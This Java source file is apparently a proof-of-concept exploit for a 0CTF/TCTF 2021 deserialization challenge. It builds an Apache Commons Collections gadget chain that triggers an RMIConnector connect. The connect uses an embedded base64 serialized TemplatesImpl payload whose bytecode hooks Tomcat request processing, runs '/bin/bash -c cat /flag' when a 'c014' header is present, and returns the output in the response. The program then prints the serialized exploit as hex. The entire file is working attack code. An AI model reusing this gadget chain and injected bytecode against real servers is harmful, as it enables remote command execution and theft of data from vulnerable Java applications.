package com.yxxx.javasec.deserialize;

import org.apache.catalina.deploy.NamingResourcesImpl;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.attoparser.ParseException;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.security.auth.message.AuthException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpFilter;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.*;



public class Poc {
    public static void main(String[] args) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        Constructor con = InvokerTransformer.class.getDeclaredConstructor(String.class);
        con.setAccessible(true);
        // need a public method
        InvokerTransformer transformer = (InvokerTransformer) con.newInstance("connect");

        // rO0A.. from Temp.java
        JMXServiceURL jurl = new JMXServiceURL("service:jmx:rmi://c014:37777/stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAEBfK/rq+AAAANAD0CgADAA8HABEHABIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC1N0YXRpY0Jsb2NrAQAMSW5uZXJDbGFzc2VzAQASTFRlbXAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACVRlbXAuamF2YQwABAAFBwATAQAQVGVtcCRTdGF0aWNCbG9jawEAEGphdmEvbGFuZy9PYmplY3QBAARUZW1wAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0BwAYAQAHY29udGV4dAgAGgEAD2phdmEvbGFuZy9DbGFzcwcAHAEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAB4AHwoAHQAgAQArb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uQ29udGV4dAcAIgEAB3NlcnZpY2UIACQBAB1vcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0SW5mbwcAJgEAA3JlcQgAKAEAIm9yZy9hcGFjaGUvY295b3RlL0Fic3RyYWN0UHJvdG9jb2wHACoBAApnZXRIYW5kbGVyCAAsAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAuAC8KAB0AMAEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHADIBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwANAA1CgAzADYBABBqYXZhL2xhbmcvVGhyZWFkBwA4AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAA6ADsKADkAPAEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAD4APwoAOQBAAQAwb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlBwBCAQAMZ2V0UmVzb3VyY2VzAQAnKClMb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3Q7DABEAEUKAEMARgEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290BwBIAQAKZ2V0Q29udGV4dAEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsMAEoASwsASQBMAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAE4BAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAUABRCgBPAFIBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRTZXJ2aWNlBwBUAQAOZmluZENvbm5lY3RvcnMBACwoKVtMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvQ29ubmVjdG9yOwwAVgBXCgBVAFgBACdvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3IHAFoBAAlnZXRTY2hlbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAXABdCgBbAF4BABBqYXZhL2xhbmcvU3RyaW5nBwBgAQAGbGVuZ3RoAQADKClJDABiAGMKAGEAZAEAEmdldFByb3RvY29sSGFuZGxlcgEAJSgpTG9yZy9hcGFjaGUvY295b3RlL1Byb3RvY29sSGFuZGxlcjsMAGYAZwoAWwBoAQAvb3JnL2FwYWNoZS9jb3lvdGUvaHR0cDExL0Fic3RyYWN0SHR0cDExUHJvdG9jb2wHAGoBABJnZXREZWNsYXJlZENsYXNzZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwwAbABtCgAdAG4BAAdnZXROYW1lDABwAF0KAB0AcQEABmdsb2JhbAgAcwEAIm9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3RHcm91cEluZm8HAHUBAApwcm9jZXNzb3JzCAB3AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwB5AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAB7AHwKAHoAfQEADmphdmEvdXRpbC9MaXN0BwB/AQAEc2l6ZQwAgQBjCwCAAIIBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAFAAhAsAgACFAQAZb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdAcAhwEABGMwMTQIAIkBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAiwCMCgCIAI0BAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAI8AkAoAYQCRAQAHZ2V0Tm90ZQwAkwCECgCIAJQBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0BwCWAQAGWC1GTEFHCACYAQAJL2Jpbi9iYXNoCACaAQACLWMIAJwBAAljYXQgL2ZsYWcIAJ4BABFqYXZhL2xhbmcvUnVudGltZQcAoAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAKIAowoAoQCkAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAKYApwoAoQCoAQARamF2YS9sYW5nL1Byb2Nlc3MHAKoBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DACsAK0KAKsArgEAEWphdmEvdXRpbC9TY2FubmVyBwCwAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAEALIKALEAswEAAlxhCAC1AQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DAC3ALgKALEAuQEAB2hhc05leHQBAAMoKVoMALsAvAoAsQC9AQAEbmV4dAwAvwBdCgCxAMABAAAIAMIBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwwAxADFCgCXAMYBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQcAyAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7DADKAMsKAMkAzAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAzgDPCgADANABAAt1c2luZ1dyaXRlcggA0gEAEWphdmEvbGFuZy9Cb29sZWFuBwDUAQAFRkFMU0UBABNMamF2YS9sYW5nL0Jvb2xlYW47DADWANcJANUA2AEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwA2gDbCgBPANwBAA5qYXZhL2lvL1dyaXRlcgcA3gEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDADgAOEKAN8A4gEABWZsdXNoDADkAAUKAN8A5QEAE2phdmEvbGFuZy9FeGNlcHRpb24HAOcBACpbTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL0Nvbm5lY3RvcjsHAOkBACFvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXIHAOsBABJbTGphdmEvbGFuZy9DbGFzczsHAO0BABNbTGphdmEvbGFuZy9TdHJpbmc7BwDvAQATamF2YS9pby9JbnB1dFN0cmVhbQcA8QEADVN0YWNrTWFwVGFibGUAIQACABUAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAFrEAAAACAAcAAAAGAAEAAAAVAAgAAAAMAAEAAAAFAAkADAAAAAgAFwAFAAEABgAAAx8ABAAbAAAB5xIZEhu2ACFLEiMSJbYAIUwSJxIptgAhTRIrEi0BtgAxTioEtgA3KwS2ADcsBLYANy0EtgA3uAA9tgBBwABDOgQqGQS2AEe5AE0BALYAU8AAIzoFKxkFtgBTwABVOgYZBrYAWToHAzYIFQgZB76iAXEHGQcVCDK2AF+2AGWgAVwZBxUIMrYAaToJGQnBAGuZAUcSK7YAbzoKAzYLFQsZCr6iATUQNBkKFQsytgBytgBlnwATEDwZChULMrYAcrYAZaABDxkKFQsyEnS2ACE6DBJ2Eni2ACE6DRkMBLYANxkNBLYANxkMLRkJAbYAfrYAU8AAdjoOGQ0ZDrYAU8AAgDoPAzYQFRAZD7kAgwEAogC/LBkPFRC5AIYCALYAU8AAiDoREooZERKKtgCOtgCSmQCYGREEtgCVwACXOhIZERKZtgCOOhMGvQBhWQMSm1NZBBKdU1kFEp9TOhS4AKUZFLYAqbYArzoVuwCxWRkVtwC0Era2ALo6FhkWtgC+mQALGRa2AMGnAAUSwzoXGRK2AMe2AM06GBkStgDHtgDREtO2ACE6GRkZBLYANxkZGRK2AMeyANm2AN0ZGBkXtgDjGRi2AOanAAmEEAGn/zunAAmECwGn/smnAAmECAGn/o2nAAg6GqcAA7EAAQAAAd4B4QDoAAEA8wAAAR4ADv8AaAAJBwBPBwBPBwBPBwB6BwBDBwAjBwBVBwDqAQAA/gAyBwDsBwDuASf/AEAAEQcATwcATwcATwcAegcAQwcAIwcAVQcA6gEHAOwHAO4BBwBPBwBPBwB2BwCAAQAA/wCCABcHAE8HAE8HAE8HAHoHAEMHACMHAFUHAOoBBwDsBwDuAQcATwcATwcAdgcAgAEHAIgHAJcHAGEHAPAHAPIHALEAAEEHAGH/ADwAEgcATwcATwcATwcAegcAQwcAIwcAVQcA6gEHAOwHAO4BBwBPBwBPBwB2BwCAAQcAiAAA+gAF/wACAAwHAE8HAE8HAE8HAHoHAEMHACMHAFUHAOoBBwDsBwDuAQAA+QAF+gACBf8AAgAAAAEHAOgEAAIADQAAAAIADgALAAAACgABAAIAEAAKAAlwdAAEbmFtZXB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ACVsAC2lQYXJhbVR5cGVzcQB+AAh4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4");

        Map hashMapp = new HashMap();
        RMIConnector rc = new RMIConnector(jurl,hashMapp);

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rc);


        HashSet hashSet = new HashSet(1);
        hashSet.add("c014");
        Field fmap = hashSet.getClass().getDeclaredField("map");
        fmap.setAccessible(true);
        HashMap innimpl = (HashMap) fmap.get(hashSet);
        Field ftable = hashMap.getClass().getDeclaredField("table");
        ftable.setAccessible(true);
        Object[] nodes =(Object[])ftable.get(innimpl);
        Object node = nodes[1];
        Field fnode = node.getClass().getDeclaredField("key");
        fnode.setAccessible(true);
        fnode.set(node, tiedMapEntry);


        oos.writeUTF("0CTF/TCTF");
        oos.writeInt(2021);
        oos.writeObject(hashSet);
        oos.close();

        byte[] exp = baos.toByteArray();
        String data = com.yxxx.javasec.deserialize.Utils.bytesTohexString(exp);
        System.out.println(data);


    }
}